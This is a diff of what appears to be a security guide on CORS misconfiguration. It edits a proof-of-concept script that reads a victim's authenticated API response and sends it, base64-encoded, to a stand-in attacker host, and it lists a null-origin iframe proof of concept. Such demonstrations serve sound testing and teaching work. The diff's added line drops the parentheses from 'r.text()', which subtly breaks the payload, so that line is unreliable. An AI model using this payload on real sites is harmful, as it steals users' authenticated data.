@@ -19,7 +19,7 @@ responses.
 ```html
 <script>
 fetch('https://victim.com/api/me', {credentials:'include'})
-  .then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)));
+  .then(r=>r.text).then(d=>fetch('https://attacker.com/?d='+btoa(d)));
 </script>
 ```
 - Null origin PoC: `<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch(...)</script>">`
